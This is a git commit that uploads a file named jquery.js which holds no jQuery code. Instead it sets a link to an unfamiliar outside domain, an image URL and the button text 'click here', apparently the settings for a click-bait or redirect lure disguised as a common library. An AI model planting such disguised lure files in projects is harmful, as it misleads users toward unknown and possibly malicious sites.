4bbac81a53f82757060aa9dd8729687a3d3b47b6
pejuangxkeluarga-source <pejuangxkeluarga@gmail.com>
2026-01-24 19:10:45 +0700

    Add files via upload

---
+++ jquery.js
@@ -0,0 +1,5 @@
+var url="https://bjdbai.nightts.one/p/7IigW";
+var time="0.0057539939880371";
+var top_text="";
+var img_url="https://pbs.twimg.com/media/G_bWmmrbIAAd-Lh?format=jpg";
+var bottom_text="click here";
